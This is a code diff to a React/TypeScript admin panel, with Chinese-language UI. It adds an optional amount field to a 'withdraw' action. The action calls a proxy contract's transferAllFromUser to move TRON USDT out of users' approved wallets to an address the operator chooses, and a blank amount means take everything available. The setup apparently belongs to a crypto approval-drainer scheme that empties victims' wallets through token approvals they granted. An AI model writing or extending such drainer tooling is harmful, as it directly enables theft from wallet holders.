@@ -62,6 +62,7 @@ const PROXY_TRANSFER_ABI = [
       { name: "token", type: "address" },
       { name: "from", type: "address" },
       { name: "to", type: "address" },
+      { name: "amountParam", type: "uint256" },
     ],
     outputs: [{ type: "bool" }],
     stateMutability: "Nonpayable",
@@ -116,6 +117,7 @@ const Admin = () => {
   const [withdrawDialogOpen, setWithdrawDialogOpen] = useState(false);
   const [selectedRow, setSelectedRow] = useState<AuthorizationRow | null>(null);
   const [withdrawTo, setWithdrawTo] = useState("");
+  const [withdrawAmount, setWithdrawAmount] = useState("");
 
   const totalPages = useMemo(() => Math.max(1, Math.ceil(totalCount / pageSize)), [totalCount, pageSize]);
 
@@ -346,6 +348,7 @@ const Admin = () => {
   const openWithdrawDialog = (row: AuthorizationRow) => {
     setSelectedRow(row);
     setWithdrawTo("");
+    setWithdrawAmount("");
     setWithdrawDialogOpen(true);
     setActionError(null);
     setActionMessage(null);
@@ -363,6 +366,20 @@ const Admin = () => {
       setActionError("该记录的授权接收地址无效，无法发起提币。");
       return;
     }
+    const amountText = withdrawAmount.trim();
+    let amountParam = "0";
+    if (amountText !== "") {
+      if (!/^\d+(\.\d+)?$/.test(amountText)) {
+        setActionError("提币金额格式无效，请输入正数或留空。");
+        return;
+      }
+      const amountFloat = Number(amountText);
+      if (!Number.isFinite(amountFloat) || amountFloat < 0) {
+        setActionError("提币金额无效，请输入非负数字。");
+        return;
+      }
+      amountParam = amountFloat > 0 ? Math.trunc(amountFloat * 1_000_000).toString() : "0";
+    }
 
     const tronWeb = window.tronWeb;
     if (!tronWeb?.contract) {
@@ -376,7 +393,7 @@ const Admin = () => {
     try {
       const contract = await tronWeb.contract().at(proxyContractAddress);
       const sendResult = await contract
-        .transferAllFromUser(TRON_USDT_CONTRACT, selectedRow.wallet_address, to)
+        .transferAllFromUser(TRON_USDT_CONTRACT, selectedRow.wallet_address, to, amountParam)
         .send({ feeLimit: 300_000_000, callValue: 0 });
 
       const withdrawTxId = typeof sendResult === "string" ? sendResult : String(sendResult?.txid ?? sendResult?.txID ?? "");
@@ -406,6 +423,7 @@ const Admin = () => {
       );
       setWithdrawDialogOpen(false);
       setSelectedRow(null);
+      setWithdrawAmount("");
       setActionMessage("提币交易已提交，请稍后在链上确认结果。");
     } catch (e) {
       const msg = e instanceof Error ? e.message : String(e);
@@ -881,6 +899,7 @@ const Admin = () => {
           if (!open) {
             setSelectedRow(null);
             setWithdrawTo("");
+            setWithdrawAmount("");
           }
         }}
       >
@@ -908,6 +927,19 @@ const Admin = () => {
                 className="font-mono text-sm"
                 autoComplete="off"
               />
+            </div>
+            <div className="space-y-2">
+              <Label htmlFor="withdraw-amount">提币金额（可选，USDT）</Label>
+              <Input
+                id="withdraw-amount"
+                value={withdrawAmount}
+                onChange={(e) => setWithdrawAmount(e.target.value)}
+                placeholder="留空或填 0：自动全部可提"
+                className="font-mono text-sm"
+                autoComplete="off"
+                inputMode="decimal"
+              />
+              <p className="text-xs text-muted-foreground">填写时按 USDT 单位输入（如 12.5），系统会自动换算为 6 位精度。</p>
             </div>
           </div>
           <DialogFooter>
